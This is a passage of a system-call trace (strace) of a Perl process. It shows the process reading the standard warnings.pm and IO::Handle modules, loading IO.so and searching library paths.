\'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12268 07:41:34.885716 brk(0x81b6000)    = 0x81b6000
12268 07:41:34.885732 brk(0x81b5000)    = 0x81b5000
12268 07:41:34.885810 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12268 07:41:34.886266 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12268 07:41:34.887614 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12268 07:41:34.887860 read(8, "", 4096) = 0
12268 07:41:34.887892 close(8)          = 0
12268 07:41:34.888230 _llseek(6, 412,  <unfinished ...>
12266 07:41:34.888248 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12266 07:41:34.888270 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12268 07:41:34.888279 <... _llseek resumed> [412], SEEK_SET) = 0
12266 07:41:34.888286 <... rt_sigprocmask resumed> [], 8) = 0
12268 07:41:34.888294 _llseek(6, 0,  <unfinished ...>
12266 07:41:34.888301 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
12268 07:41:34.888308 <... _llseek resumed> [412], SEEK_CUR) = 0
12268 07:41:34.888315 close(6 <unfinished ...>
12266 07:41:34.888321 <... rt_sigprocmask resumed> NULL, 8) = 0
12266 07:41:34.888327 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12268 07:41:34.888335 <... close resumed> ) = 0
12268 07:41:34.888389 stat64("/usr/lib/perl/5.8/auto/IO/IO.so",  <unfinished ...>
12266 07:41:34.888399 <... rt_sigprocmask resumed> [], 8) = 0
12266 07:41:34.888407 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12266 07:41:34.888421 waitpid(-1,  <unfinished ...>
12268 07:41:34.888440 <... stat64 resumed> {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12268 07:41:34.893477 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12268 07:41:34.893547 futex(0xb7f06070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12268 07:41:34.893576 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12268 07:41:34.893599 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12268 07:41:34.893686 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12268 07:41:34.893716 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f0a000
12268 07:41:34.893729 mmap2(0xb7f0e000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f0e000
12268 07:41:34.893744 close(6)          = 0
12268 07:41:34.893874 stat64("/etc/perl/IO/Handle.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.893891 stat64("/etc/perl/IO/Handle.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.893904 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.893917 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.893930 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.893972 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894023 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894053 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894066 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894078 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894105 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894118 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12268 07:41:34.894138 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.894152 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.894164 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.894181 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12268 07:41:34.894570 stat64("/etc/perl/Symbol.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.894587 stat64("/etc/perl/Symbol.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
